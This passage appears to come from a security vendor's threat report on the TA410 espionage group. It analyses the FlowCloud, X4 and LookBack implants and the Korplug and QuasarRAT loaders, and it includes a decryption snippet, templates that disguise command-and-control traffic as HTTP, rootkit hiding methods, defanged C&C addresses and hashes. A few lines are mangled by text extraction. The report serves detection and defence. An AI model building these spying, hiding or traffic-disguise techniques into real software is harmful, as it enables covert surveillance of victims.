mentioned, this implant uses a lot of classes. Rather than documenting each of them individually, we will present an\noverview of the available functionality by grouping them into three categories: those that interact with the file system, functionalities that\ncollect information about programs and processes, and those that gather real-time information about user activity.\n\n**_File system_**\n\nFlowCloud provides interaction with the file system in a variety of ways, most of which can store file metadata and content in their SQLite\ndatabase.\n\nOne of these is a component that walks through all mapped file systems and collects files that are not excluded by filters in the\nsmfile_search_policy. It also creates an invisible window that listens for file creation, modification, or renaming events. The corresponding\nfiles are collected unless they are excluded by that policy.\n\nAnother component collects information about mapped volumes, including mount point, name, drive type, and disk usage data. This same\nclass collects file and directory metadata.\n\nAs a complement to these automated measures, the backdoor implements functions that provide full access and control over the content of\nmounted drives. This includes bidirectional file transfers between the C&C and the compromised machine.\n\n**_Programs and processes_**\n\nFlowCloud is able to automatically obtain a list of installed software through the use of the undocumented IShellAppManager COM interface.\nThis functionality can also be invoked via a C&C command. Figure 14 shows, after the extraneous code has been removed, how that\ninterface is used.\n\n_Figure 14. Simplified code showing how the IShellAppManager COM interface is used to list installed applications_\n\nOther commands can be used to retrieve a detailed list of available services and currently running processes.\n\nAnother interesting feature is the near real-time monitoring of process activity. To achieve this, FlowCloud runs WMI queries every second to\nget all process creation and termination events. The obtained information is correlated with data from the Win32_Process table for a more\ndetailed view.\n\n**_User activity_**\n\nFlowCloud is able collect a miscellany of data that we have decided to group under the “User activity” umbrella.\n\n\n-----\n\nt as t e ab ty to o to t e c pboa d o c a ges a d sa e a y data t co ta s s see gu e 5, t ac e es t s by c eat g a\ninvisible window with a custom class and registering two clipboard formats. This window uses AddClipboardFormatListener (on Windows\nVista or more recent) or SetClipboardViewer (on Windows XP and prior) to listen for clipboard content changes.\n\n_Figure 15. Set up monitoring of the clipboard_\n\nCollected clipboard content is stored along with information about the current foreground window. This information can help attackers\nunderstand the data by contextualizing it.\n\nFlowCloud can periodically take screenshots and store them with information about the foreground process and time since the last user input.\nTo limit the disk space used, images where fewer than 5% of the pixels differ from the most recently stored capture aren’t saved. This feature\ncan also be invoked on demand by the server.\n\nAnother of the backdoor’s components records mouse and keyboard activity to a database. It does not collect these directly, but instead acts\nin tandem with the keylogger component of the driver (described in the next section) by reading data from the\n\\\\.\\pipe\\namedpipe_keymousespy_english named pipe.\n\nInterestingly, FlowCloud can also gather information about things happening around the victim’s computer. The first way it does so is through\na C&C command that takes a picture using connected camera peripherals. This feature is implemented using the CCameraDS class from\nOpenCV.\n\nThe second way it can collect information about the computer’s surroundings is by recording audio. Much like a voice assistant, FlowCloud\ncan use a computer’s microphone to listen to its surroundings, but instead of recording being triggered by a command word, it seems to be\ntriggered by any sound over a threshold defined by the decibel_limit field of the audio_policy. The default value is 65 decibels, which is in the\n[upper range of normal conversation volume (commonly defined to be anywhere between 50 and 70 dB by various sources).](https://www.earq.com/hearing-health/decibels)\n\n**_Self-decrypting DLL (setlangloc.dat)_**\n\nThe loaded shellcode is a self-decrypting DLL. It first decrypts the embedded DLL using a byte-oriented XOR-and-ADD scheme (shown in\nFigure 16). The shellcode we analyzed used the key 0x7B. Once it has decrypted the embedded DLL, the shellcode manually performs the\nfunctions of LoadLibrary and calls the loaded module’s startModule export.\n\n\n1\n\n2\n\n\nfor (int i=0; i < ciphertext_length; i++)\n\nplaintext[i] = ((encrypted[i] ^ key) + key) & 0xFF\n\n\n_Figure 16. Pseudocode for the DLL decryption routine_\n\nThis newly loaded module uses the same anti-debugging and anti-analysis techniques as the hijacking DLL described above. On top of\nthose, it also uses a few tricks of its own:\n\nCovers its tracks by overwriting the code previously modified by the malicious library with a useless call to lstrlenW.\nBase64-encoded strings are used for function imports (via GetProcAddress) and only decoded as needed.\nExits if the process’s executable is not the expected DLL hijacking target (e.g., setlang.exe).\n\nThe module creates a new process using the same executable and performs process injection on it, redirecting the existing thread to the\nwritten code region. This code inside the new process launches a thread that decrypts and loads the fcClient module before calling its\nstartModule export That function will perform the final stages of the installation and load the DLL containing the backdoor functionality\n\n\n-----\n\n**_(_** **_y )_**\n\nFlowCloud’s driver serves a dual purpose: it acts as both a keylogger and a rootkit. It accomplishes this mainly by hijacking native drivers’\nhandler functions for specific I/O control codes and replacing them with its own:\n\nRead (IRP_MJ_READ) for the keyboard driver (kbdclass or KeyboardClass0)\nRead (IRP_MJ_READ) for the mouse driver (mouclass or PointerClass0)\nDevice control (IRP_MJ_DEVICE_CONTROL) for the network driver (tcpip or nsiproxy)\n\nThe driver also provides kernel-level functionalities to be used by the RAT. They can be invoked via IO control codes or by writing to specific\nregistry keys.\n\nThis module is signed with a certificate with the thumbprint 02ED6A578C575C8D9C72398E790354B095BB07BC. Issued to Hangzhou\nLeishite Laser Technology Co. in 2012 by Wosign and revoked in 2014, it seems most likely this certificate was stolen.\n\n**_Keylogging_**\n\n[In its IRP_MJ_READ handlers for keyboard and mouse events, the driver simply records IO events to lookaside lists before passing them to](https://geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/lookasid/index.htm)\nthe legitimate handler. This ensures that the driver doesn’t interfere in a way that could be noticeable by the user. These events are then\nparsed to the format used by the backdoor’s keymouse_manager and written to the named pipe \\\\.\\pipe\\namedpipe_keymousespy_english.\n\n**_Rootkit_**\n\nAfter hijacking the aforementioned drivers, the rootkit erases the DLL names associated with them from internal structures used to display\ndevice drivers.\n\nThe rootkit can prevent processes from being shown by utilities that list running processes, such as Task Manager. As shown in Figure 17, it\nachieves this by removing their entries from the ActiveProcessLinks list of the undocumented KPROCESS kernel structure. Since this\nstructure is not part of the public API and can change between releases, the rootkit contains code to match the operating system’s build\nnumber to the correct offsets in this structure. That code covers all versions from Windows XP to Windows 10 20H1. This functionality can be\ninvoked on any process via the IOCTL_HIDE_PROCESS_BY_PROCESSID (0x222028) control code. It is also used, on driver startup, to\nhide the process with the PID contained in the registry key HKLM\\HARDWARE\\{76BA14B7-AF0C-4dc9-9E9D-2A6970F231D9}. This process\nis further camouflaged by changing its associated executable filename to one of svchost.exe or dllhost.exe in the same kernel structure.\n\n_Figure 17. Function used to prevent a process from being displayed in lists of running processes_\n\nThrough its hijacking of the network driver, the rootkit can also hide a single process’s network traffic from local utilities. The process whose\ntraffic is to be hidden is set through the IOCTL_SET_TRAFFICHIDE_PROCESSID (0x222048) control code.\n\nSome of the rootkit’s functions are used by the fcClientDll module to hide the process in which it is running.\n\nControl codes to manipulate a process name in various internal structures are also exposed by the driver.\n\n**_Persistence module (fcClientWD)_**\n\n\n-----\n\ns odu e s e at e y s p e co pa ed to ot e co po e ts e p e ous y e t o ed et as a eady acco p s es pe s ste ce ost\ncases, by executing on system startup. This module complements that mechanism by ensuring persistence in a very specific edge case\nwhere execution of the malware might be interrupted: the user logs out on a system with hibernation and Fastboot enabled. On systems\nwhere either of those is disabled, this module does nothing.\n\n**_FlowCloud v4.1.3_**\n\n[This older version of FlowCloud has already been described in a Proofpoint blogpost and presents similarities to the newer version described](https://www.proofpoint.com/us/blog/threat-insight/flowcloud-version-413-malware-analysis)\nin the preceding subsections, so we will only highlight notable differences and new information revealed by our analysis.\n\nThis version runs multiple anti-analysis and anti-detection checks before executing its payload, and terminates if any of those tests detect that\nthe process is being analyzed. It checks running processes for executables of several known cybersecurity vendors. While most of these\nnames are also present in version 5, this list is not a strict subset of the one v.5 uses. This tends to support the proposition that versions 4\nand 5 of FlowCloud are maintained in parallel.\n\n[It also embeds a DLL version of the Pafish (aka Paranoid Fish) sandbox and analysis detection tool as one of its encrypted resources. This](https://github.com/a0rtega/pafish)\nlibrary is loaded in memory and all of the anti-analysis/anti-sandboxing checks it implements are run.\n\nInterestingly, the driver installed is the same as the one for version 5.0.2. Those used by version 5.0.3 provide identical functionality, but differ\nslightly.\n\n### TA410 – LookingFrog\n\nLookingFrog uses two main malware families: X4 and LookBack. We have seen both of them on machines belonging to the same victim.\n\n**_X4_**\n\nX4 is a custom backdoor that is used as a first stage, before LookBack is deployed. It is loaded by a VMProtect-ed loader, usually named\nPortableDeviceApi.dll or WptsExtensions.dll. Unfortunately, we were not able to uncover any persistence method.\n\nThe loader injects an orchestrator into memory in a svchost.exe process. In turn, the orchestrator injects the network component into memory\nand communicates with it via a file located at C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys\\Log\\rsa.txt. Figure 18 shows a summary of\nthe X4 components.\n\n_Figure 18. Summary of the X4 components_\n\nThe network component is shellcode. It is encrypted using the AES algorithm and stored in the Windows registry. Table 2 shows the three\nregistry keys used by X4.\n\n_Table 2. Network shellcode registry keys_\n\n**Registry Key** **Description**\n\nHKLM\\SOFTWARE\\Microsoft\\DRM\\X4Key AES key.\n\nHKLM\\SOFTWARE\\Microsoft\\DRM\\PSKey Name of the process into which the shellcode will be injected (spoolsv.exe).\n\nHKLM\\SOFTWARE\\Microsoft\\DRM\\X4Data Encrypted shellcode.\n\n\n-----\n\ne dec ypted s e code oo s e t as based o etasp o t a d co u cates t a a dcoded add ess a te est g\ncharacteristic is that it uses the fake Host header onedrive.live.com.\n\nEvery second, the orchestrator, which lives in memory only, reads the cleartext rsa.txt file to check whether there are new commands to\nexecute. The commands are received from the C&C server, via the network shellcode. In the orchestrator, the commands are identified by a\nnumerical identifier that is computed from the command name, as shown in Figure 19.\n\n_Figure 19. Custom hash function seen in X4_\n\nThe orchestrator handles seven commands, detailed in Table 3. Output of these commands is written to\nC:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys\\Log\\output.log.\n\n_Table 3. X4 backdoor commands_\n\n**ID** **Name** **Description**\n\n0x3ECFF9B9D92 osload Write new encrypted shellcode to HKLM\\SOFTWARE\\Microsoft\\DRM\\X4Data. It can also modify X4Key and\nPSKey.\n\n0x3F5FAFC0EDD pskill Kill a process by PID.\n\n0x3F5FB1E6015 pslist List the running processes using CreateToolhelp32Snapshot and Process32Next.\n\n0x3B6C27610D1 inject Decrypt and inject  shellcode, from encrypted form on disk, into memory.\n\n0xDA83E71 exec Execute a given command line.\n\n0xE9478DC live Get the PID of the process in which the orchestrator is running.\n\n0x6D6E70D40 cacls Modify the access controls of a given object using SetEntriesInAclA, SetNamedSecurityInfoA and\nBuildExplicitAccessWithName.\n\nX4 provides basic functionalities to control the machine remotely, but it lacks more advanced spying capabilities.\n\n### LookBack\n\n[The LookBack backdoor has previously been described by Proofpoint; we are therefore providing a quick summary and our analysis of the](https://www.proofpoint.com/us/threat-insight/post/lookback-malware-targets-united-states-utilities-sector-phishing-attacks)\ncustom network protocol.\n\n**_Backdoor_**\n\nIn all samples we observed, the LookBack loader is a legitimate version of libcurl.dll with the curl_share_init (ordinal #52) export modified to\n[load the SodomNormal communications module. This corroborates the observation by Proofpoint researchers. This module is embedded in](https://www.proofpoint.com/us/threat-insight/post/lookback-malware-targets-united-states-utilities-sector-phishing-attacks)\nthe library’s resource section and encrypted with an algorithm similar to RC4. The encryption/decryption function, shown in Figure 20, always\nuses the same key.\n\n\n-----\n\n_Figure 20. Decompiled view of the function used to encrypt and decrypt the embedded module_\n\nThe SodomNormal component tries to read configuration information from a sodom.ini file. This configuration file is encrypted using the justdescribed function and starts with the magic bytes 0xAF1324BC. If this file is unavailable or invalid, a hardcoded default configuration is used.\n\nA unique victim ID is then generated from the victim’s CPUID, username, and IP address. This is sent to the server along with the computer’s\nname and the configuration data. The communications module then downloads the main backdoor module, named SodomMain, from the\nC&C server. Unfortunately, we couldn’t obtain this module.\n\n**_Communication protocol_**\n\nLookBack can communicate over HTTP or via its “normal protocol”. In either case, the data being transferred is the same.\n\nLookBack’s normal protocol uses raw TCP sockets and a custom message format described in Table 4. This message is composed of eight\nheader fields, followed by a body of variable length. The message body is encrypted with the function previously described for the\nSodomNormal resource in the loader (Figure 20). The encrypted data is then compressed with the deflate algorithm via the compress function\nof the statically linked zlib.\n\n_Table 4. LookBack message format_\n\n**Field** **Offset (bytes)** **Note**\n\nMagic bytes 0x00 The constant 0x48AB2EC2. Messages that don’t start with this magic value are discarded.\n\n<Message dependent> 0x04\n\nCompressed body size 0x08\n\nUncompressed body size 0x0C\n\nChecksum 0x10 CRC32 of the message body.\n\nMessage type 0x14 Integer value indicating the message’s content and the associated action to be performed.\n\nWe have found code for over 50 message types. There seems to be little to no overlap\nbetween the values used by the client and the server. Table 5 presents the types we have\nanalyzed in more depth.\n\n<Message dependent> 0x18\n\n<Message dependent> 0x1C\n\nMessage Body 0x20 The message body can be empty. In this case, the checksum and length fields are set to 0x00.\n\n\n-----\n\n_ab e 5_ _oo_ _ac_ _essage types_\n\n**Message type** **Used by** **Description**\n\n**2** Client Register with C&C server. The body contains configuration and information about the victim host.\n\n**3** Server Acknowledgment for message type 2.\n\n**8** Client Request to download the main backdoor component (SodomMain).\n\n**9** Server Reply to message type 8. The message body contains the SodomMain file.\n\n**36 and 38** Client Transfer file to server in message body.\n\n**35 and 37** Server Response to message 36 or 38.\n\n**41** Client Request file from server.\n\n**42** Server Transfer file to client in message body (response to message 41)\n\nThe HTTP protocol uses the message format detailed in the previous paragraph, but it adds a few extra steps to disguise its traffic as\nlegitimate HTTP. It uses a pair of hardcoded templates, one for client requests and another for server responses. The fields required for\nHTTP, such as content length, address, and port number, are filled in with the correct values; useless data is used for the others.\n\nFor client requests, the messages are encoded with a modified hexadecimal algorithm that uses the encoding alphabet a-p instead of the\nconventional 0-9a-f. This provides some obfuscation and ensures that messages will not contain binary data or be obviously hex encoded,\nboth of which could look suspicious in an application/x-www-form-urlencoded message. The request’s body is composed of this encoded\nvalue prefixed with the hardcoded string id=1&op=report&status=. Client request and server response templates are shown in Figure 21 and\nFigure 22 respectively, with the template fields in angle brackets.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n\nPOST <C&C address + port>/status.php?r=<epoch timestamp><random 16-bit int> HTTP/1.1\n\nAccept: text/html, application/xhtml+xml, */*\n\nAccept-Language: en-us\n\nUser-Agent: <return value of ObtainUserAgentString OR \"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\">\n\nContent-Type: application/x-www-form-urlencoded\n\nAccept-Encoding: gzip, deflate\n\nHost: <C&C url>\n\nContent-Length: <content length>\n\nConnection: Keep-Alive\n\nCache-Control: no-cache\n\nid=1&op=report&status=<encoded LookBack message>\n\n\n_Figure 21. Template used for HTTP client requests_\n\nOn the server side, the data described in the previous section is sent directly as binary data in the body with a header purporting it is a GIF\nimage.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n\nHTTP/1.1 200 OK\n\nServer: nginx/1.12.2\n\nDate: <current time> GMT\n\nLast-Modified: <current time - 100 seconds> GMT\n\nETag: <3 random 16-bit ints>\n\nAccept-Ranges: bytes\n\nContent-Length: <content length>\n\nKeep-Alive: timeout=5, max=100\n\nConnection: Keep-Alive\n\nContent-Type: image/gif\n\n<LookBack message>\n\n\n_Figure 22. Template used for HTTP server responses_\n\n### TA410 – JollyFrog\n\nThis third team uses off-the-shelf malware from the known malware families QuasarRAT and Korplug (aka PlugX). JollyFrog mostly aligns\n[with what was described by Fortinet as APT10.](https://www.fortinet.com/blog/threat-research/uncovering-new-activity-by-apt-)\n\n**_Korplug_**\n\n[Korplug, also known as PlugX, is a backdoor that has been used for years by many different cyberespionage groups. Despite being well](https://attack.mitre.org/software/S0013/)\nknown, it is still in use and we have observed TA410 using it as recently as in April 2021.\n\nIn the case of TA410, Korplug arrives as a RARSFX archive, generally named m.exe, containing three files:\n\nqrt.dll: A custom loader.\nqrtfix.exe: A legitimate signed application from F-Secure, vulnerable to DLL search-order hijacking.\nqrt.dll.usb: The Korplug shellcode.\n\nThe loader allocates memory using VirtualAlloc and copies the content of qrt.dll.usb there. Then it jumps right into the shellcode that will\ndecompress and load the Korplug payload.\n\n**_QuasarRAT_**\n\n[QuasarRAT is a full-featured backdoor freely available on GitHub. It is used by numerous threat actors who perform cyberespionage or](https://github.com/quasar/Quasar)\ncybercrime.\n\nTA410 uses a custom downloader and a custom loader written in .NET, which are convenient for identifying their instances of QuasarRAT\namong all the noise created by other attackers.\n\nNamed sll.exe, this downloader is digitally signed with the certificate seen in Figure 23. The certificate is likely stolen and belongs to 北京和赢\n讯时科技有限公司 (translated: Beijing Heyingxunshi Technology Co., Ltd.) with thumbprint\n850821D88A4475F0310F10FBA806353A4113D252. Although the certificate has now been revoked, it was still valid when this sample was\nsigned on August 10, 2020.th\n\n\n-----\n\n_Figure 23. Digital signature of the QuasarRAT downloader_\n\nThis downloader simply downloads the loader and encrypted QuasarRAT payload from the hardcoded C&C server http://ffca.caibi379[.]com,\n[at /rwjh/new/. This server was previously linked to FlowCloud (FlowingFrog). The loader is named PresentationCache.exe and is protected](https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new)\nwith _[DNGuard, a commercial .NET packer. It is also signed with the same certificate as the downloader. It decrypts and loads the final](http://www.dnguard.net/)_\nQuasarRAT payload, which uses cahe.microsofts[.]org as its C&C server.\n\n## Conclusion\n\nTA410 is a cyberespionage umbrella targeting high-profile entities such as governments and universities worldwide. ESET is revealing its\n[latest findings about this group, including results from ongoing research, during Botconf 2022.](https://www.botconf.eu/)\n\nInitial access to targets is obtained by exploiting vulnerable internet-facing applications such as Microsoft Exchange, or by sending\nspearphishing emails with malicious attachments such as RTF documents created via the Royal Road builder. Even though the JollyFrog\nteam uses generic tools, FlowingFrog and LookingFrog have access to complex implants such as FlowCloud and LookBack. YARA and Snort\n[rules for these implants are available in ESET’s GitHub repository.](https://github.com/eset/malware-ioc)\n\n_For any inquiries about our research published on WeLiveSecurity, please contact us at_ _[threatintel@eset.com.](http://10.10.0.46/mailto:threatintel@eset.com)_\n_ESET Research now also offers private APT intelligence reports and data feeds. For any inquiries about this service, visit the ESET Threat_\n_Intelligence page._\n\n## IoCs\n\n### Files\n\n**SHA-1** **Filename** **Detection** **Description**\n\nC96558312FBF5847351B0B6F724D7B3A31CCAF03 N/A Win32/Agent.UWR FlowCloud v5.0.3 init\nloader.\n\n1403241C415A8D686B1148FA4229A2EB833D8D08 setlangloc.dll Win32/Agent.UNL FlowCloud DLL\nhijacking malicious\nlibrary.\n\n38D0E92AFF991CFC9C68D7BAAD6CB85916139AF5 hidmouse.sys Win32/Agent.UKR TA410 32-bit\nRootkit/Keylogger dri\n\nAF978ED8AD37CE1437A6B42D96BF518D5C4CFD19 hidmouse.sys Win64/Agent.UKR TA410 64-bit\nRootkit/Keylogger dri\n\n\n-----\n\n**SHA-1** **Filename** **Detection** **Description**\n\nB70F3A3A9B5B8506EE95791469CA496E01AD7DAF winver32.dll Win32/Agent.ULH FlowCloud v4.1.3\nhcClientLoaderZero_\nbackdoor.\n\n014421BDB1EA105A6DF0C27FC114819FF3637704 hhh.exe Win32/Agent.ABYK FlowCloud v4.1.3 init\nloader.\n\nEA298866E5A61FEEA4D062987F23B10A78C8A4CA N/A Win32/Agent.ULH FlowCloud v4.1.3\nbackdoor.\n\n021B9E2E8AA30B29569254C0378A9F43E4F32EEC winver64.dll Win64/Agent.KM FlowCloud v4.1.3\nhcClientLoaderZero_\nbackdoor.\n\n2A2F08FAD6B0A86DC94885224687D954E739CC21 N/A Win32/ParanoidFish.A Pafish sandbox\ndetection tool.\n\n3658B7CCA13C8C8AD03E9B6AEFE4B9CBE48E3C81 hidmouse.sys Win64/Agent.UKR TA410\nRootkit/Keylogger dri\n\n517488F6BD0E7FC9EDE82F37226A75212B277E21 hidmouse.sys Win64/Agent.UKR TA410\nRootkit/Keylogger dri\n\nC05B4AD7A3322917E17710842FB88A090198D51F N/A Win32/Agent.TWI LookBack trojanized\nlibcurl loader.\n\nDB2DF1BDF8145CB8ABA3A2026A3CC3EF4F1762BE phx.dll Win32/Agent.TWI LookBack trojanized\nlibcurl loader.\n\nEDE2AB811311FC011B1E89C5A0B7A60C123B7398 hidmouse.sys Win64/Agent.UKR TA410\nRootkit/Keylogger dri\n\n7AA35BA7030AFCD271436DE8173D7B2F317A1BFC libcurl.dll Win32/Agent.TWI LookBack trojanized\nlibcurl loader.\n\nA5C02ABE698300F3DE0B7CC7F0856652753831DA libcurl.dll Win32/Agent.TWI LookBack trojanized\nlibcurl loader.\n\n613C4AFAE8F5F80F22DCD1827E3230FCA361ADA5 libcurl.dll Win32/Agent.UKD LookBack trojanized\nlibcurl loader.\n\n859CD6DFDADAB3D6427C6C1C29581CB2094D648F meterpreter.exe Win32/Rozena.CP Metasploit Meterpret\nbackdoor.\n\nDBEA7F0C0D2BF8BC365A2D1572CA1538FE8FB9A3 responsor.dat Win32/Agent.ULL FlowCloud fcClientDL\nfinal stage backdoor.\n\nADD5B4FD9AEA6A38B5A8941286BC9AA4FE23BD20 絆邧坋蔡趕口昴.doc Win32/Exploit.Agent.TY Malicious Royal Roa\ndocument.\n\n7BA42061568FF6D9CA5FE5360DCE74C25EA48ADA N/A Win32/Agent.ACKQ Packed Tendyron\ndownloader.\n\nD81215890703C48B8EA07A1F50FEC1A6CA9DF88B N/A Win32/TrojanDownloader.Agent.FLI Unpacked Tendyron\ndownloader.\n\nF359D3C074135BBCA9A4C98A6B6544690EDAE93D OnKeyToken_KEB.dll Win32/Injector.ELGA Tendyron malicious D\n\n621B31D5778EC2FB72D38FB61CED110A6844D094 N/A Win64/Rozena.AO X4 network shellcode\n\nBC11DC8D86A457A07CFE46B5F2EF6598B83C8A1F m.exe Win32/Injector.EMVA Korplug dropper.\n\nC369E1466F66744AA0E658588E7CF2C051EE842F qrt.dll Win32/Injector.EMVA Korplug loader.\n\nB868764C46BADC152667E9128375BA4F8D936559 qrt.dll.usb N/A Korplug encrypted\npayload.\n\nBDECA89B4F39E6702CE6CBBC9E6D69F6BBAB01C8 N/A N/A Korplug decrypted\npayload.\n\n5379FBB0E02694C524463FDF7F267A7361ECDD68 sll.exe MSIL/TrojanDownloader.Agent.GPS QuasarRAT downloa\n\n6CC6170977327541F8185288BB9B1B81F56D3FD0 PresentationCache.exe MSIL/Agent.TZG QuasarRAT loader.\n\nD95185A4A3F8512D92F69D2ED7B8743638C54BE8 N/A MSIL/Spy.Agent.AES QuasarRAT backdoo\n\n\n-----\n\n**SHA-1** **Filename** **Detection** **Description**\n\nBE7F0E41CD514561AED43B07AA9F5F0842BF876C HTra.exe Win32/HackTool.Hucline.AB HUC Packet Transm\n(HTran).\n\n7F663F50E9D6376715AEB3AB66DEDE038258EF6C HTran13.exe Win32/HackTool.Hucline.S HUC Packet Transm\n(HTran).\n\nBEDA1224B3BB9F98F95FF7757D2687F4D9F4B53A event.exe Win32/Agent.UJN Simple cmd.exe-base\nbackdoor compiled w\nMingW.\n\n2B61E7C63A0A33AAC4CF7FE0CEB462CF6DACC080 htran.exe Win32/HackTool.Hucline.AB HUC Packet Transm\n(HTran).\n\nEF3C796652141B8A68DCCF488159E96903479C29 htran_f-secury.exe Win32/HackTool.Hucline.AB HUC Packet Transm\n(HTran).\n\n6B547C244A3086B5B6EA2B3A0D9594BBE54AE06B inbt.zip Python/HackTool.Agent.J EXE masquerading a\nZIP. This is a Python\nnetwork scanner\n(compiled with\nPyInstaller).\n\n4CDCE3AF614C2A5E60E71F1205812AB129C0955B msd017.exe Python/Exploit.MS17-010.B This is a Python scan\n(compiled with\nPyInstaller) for the\nvulnerability MS17-0\n(EternalBlue).\n\n### Certificates\n\n**Serial number** 0F8B600FF1882E\n\n**Thumbprint** 02ED6A578C575C8D9C72398E790354B095BB07BC\n\n**Subject CN** Hangzhou Leishite Laser Technology Co., Ltd.\n\n**Subject O** Hangzhou Leishite Laser Technology Co., Ltd.\n\n**Subject L** Hangzhou\n\n**Subject S** Zhejiang\n\n**Subject C** CN\n\n**Valid from** 2012-03-29 09:07:04 UTC\n\n**Valid to** 2014-04-02 06:24:19 UTC\n\n**Serial number** 4ED8730F4E1B8558CD1CB0107B5F776B\n\n**Thumbprint** 850821D88A4475F0310F10FBA806353A4113D252\n\n**Subject CN** 北京和 赢讯时 科技有限公司 (translation: Beijing  Heyingxunshi Technology Co., Ltd.)\n\n**Subject O** 北京和 赢讯时 科技有限公司 (translation: Beijing Heyingxunshi Technology Co., Ltd.)\n\n**Subject OU** 研 发 部 ( R&D Department)\n\n**Subject S** 北京市 (Beijing)\n\n**Subject C** CN\n\n**Valid from** 2019-11-13 00:00:00 UTC\n\n**Valid to** 2020-11-12 23:59:59 UTC\n\n### Network\n\n**Domain** **IP** **First seen** **Details**\n\n43.254.216[.]104 2020-06 Delivery server\n\n\n-----\n\n**Domain** **IP** **First seen** **Details**\n\n45.124.115[.]103 2020-08 Delivery server\n\n161.82.181[.]4 2020-12 Delivery server\n\n43.254.219[.]153 2020-07 X4 C&C server\n\n154.223.141[.]36 2020-06 HTran C&C server\n\n103.139.2[.]93 2020-10 Tendyron C&C server\n\ncahe.microsofts[.]com QuasarRAT C&C server\n\nffca.caibi379[.]com QuasarRAT downloader C&C server\n\nsmtp.nsfwgo[.]com Korplug C&C server\n\n45.124.115[.]103 2020-06 LookBack C&C server\n\n185.225.19[.]17 2021-01 LookBack C&C server\n\n94.158.245[.]249 2020-03 LookBack C&C server\n\n5.252.179[.]227 2021-03 LookBack C&C server\n\n222.186.151[.]141 2019-11 FlowCloud C&C server\n\n47.111.22[.]65 2020-09 FlowCross C&C server\n\n114.55.109[.]199 2020-05 FlowCloud C&C server\n\ndlaxpcmghd[.]com 185.225.17[.]39 2020-09 LookBack C&C server\n\nwwww.dlmum[.]com N/A FlowCloud C&C server\n\n## MITRE ATT&CK techniques\n\n[This table was built using version 9 of the MITRE ATT&CK framework.](https://attack.mitre.org/resources/versions/)\n\n**Tactic** **ID** **Name** **Description**\n\n\nResource\nDevelopment\n\n\n[T1587.001](https://attack.mitre.org/versions/v9/techniques/T1587/001/) Develop Capabilities: Malware TA410 develops LookBack and\nFlowCloud.\n\n\n[T1588.003](https://attack.mitre.org/versions/v9/techniques/T1588/003) Obtain Capabilities:\nCode Signing\nCertificates\n\n[T1588.005](https://attack.mitre.org/versions/v9/techniques/T1588/005/) Obtain Capabilities:\nExploits\n\n\nTA410 uses stolen code-signing certificates.\n\nTA410 had exploits for ProxyLogon and ProxyShell.\n\n\nInitial Access [T1190](https://attack.mitre.org/versions/v9/techniques/T1190/) Exploit Public-Facing Application TA410 has exploited web server\nvulnerabilities for initial access.\n\n\n[T1566.001](https://attack.mitre.org/versions/v9/techniques/T1566/001/) Phishing:\nSpearphishing\nAttachment\n\n\nTA410 uses malicious RTF and DOCX attachments to\ncompromise victims.\n\n\nExecution [T1106](https://attack.mitre.org/versions/v9/techniques/T1106/) Native API FlowCloud makes extensive use\nof the Windows API to execute\ncommands and launch processes.\n\n[T1129](https://attack.mitre.org/versions/v9/techniques/T1129/) Shared Modules TA410’s backdoors can load DLLs and execute their\npayloads.\n\n\n[T1203](https://attack.mitre.org/versions/v9/techniques/T1203/) Exploitation for Client\nExecution\n\n[T1559.001](https://attack.mitre.org/versions/v9/techniques/T1559/001/) Inter-Process\nCommunication:\nComponent Object\nModel\n\n[T1047](https://attack.mitre.org/versions/v9/techniques/T1047) Windows\nManagement\nInstrumentation\n\n\nTA410 uses Royal Road RTF documents to compromise\nvictims.\n\nFlowCloud uses COM interfaces to schedule tasks and\nperform WMI queries.\n\nTA410 uses WMI for lateral movement and information\ngathering.\n\n\n-----\n\n**Tactic** **ID** **Name** **Description**\n\nPersistence [T1053.005](https://attack.mitre.org/versions/v9/techniques/T1053/005/) Scheduled Task/Job: Scheduled Task FlowCloud creates a scheduled\ntask for persistence.\n\n\n[T1505.003](https://attack.mitre.org/versions/v9/techniques/T1505/003/) Server Software\nComponent: Web\nShell\n\n[T1543.003](https://attack.mitre.org/versions/v9/techniques/T1543/003/) Create or Modify\nSystem Process:\nWindows Service\n\n\nTA410 plants webshells on vulnerable web servers.\n\nFlowCloud can be configured to create a service for\npersistence.\n\n\nDefense\nEvasion\n\n\n[T1027](https://attack.mitre.org/versions/v9/techniques/T1027/) Obfuscated Files or Information FlowCloud files are distributed and\nstored in encrypted form.\n\n\n[T1036.004](https://attack.mitre.org/versions/v9/techniques/T1036/004/) Masquerading:\nMasquerade Task or\nService\n\n[T1036.005](https://attack.mitre.org/versions/v9/techniques/T1036/005/) Masquerading: Match\nLegitimate Name or\nLocation\n\n\nThe driver component of FlowCloud masquerades as a\nmouse driver service.\n\nFiles named after legitimate utilities are written into the\n%ProgramFiles%\\MSBuild\\Microsoft\\Expression\\Blend\\msole\\\nsubdirectory.\n\n\n[T1014](https://attack.mitre.org/versions/v9/techniques/T1014/) Rootkit FlowCloud uses a rootkit to hide its network traffic and\nprocesses from system utilities.\n\n\n[T1055.001](https://attack.mitre.org/versions/v9/techniques/T1055.001/) Process Injection:\nDynamic-link Library\nInjection\n\n\nFlowCloud uses both regular and reflective DLL injection. It\nalso manually loads some DLLs, bypassing calls to\nLoadLibrary.\n\n\n[T1055](https://attack.mitre.org/versions/v9/techniques/T1055/) Process Injection TA410’s backdoors perform process injection to masquerade\nas harmless processes.\n\n\n[T1055.003](https://attack.mitre.org/versions/v9/techniques/T1055/003/) Process Injection:\nThread Execution\nHijacking\n\n[T1055.012](https://attack.mitre.org/versions/v9/techniques/T1055/012/) Process Injection:\nProcess Hollowing\n\n[T1140](https://attack.mitre.org/versions/v9/techniques/T1140/) Deobfuscate/Decode\nFiles or Information\n\n[T1574.002](https://attack.mitre.org/versions/v9/techniques/T1574/002/) Hijack Execution\nFlow: DLL SideLoading\n\n[T1497](https://attack.mitre.org/versions/v9/techniques/T1497/) Virtualization/Sandbox\nEvasion\n\n[T1134.002](https://attack.mitre.org/versions/v9/techniques/T1134/002/) Access Token\nManipulation: Create\nProcess with 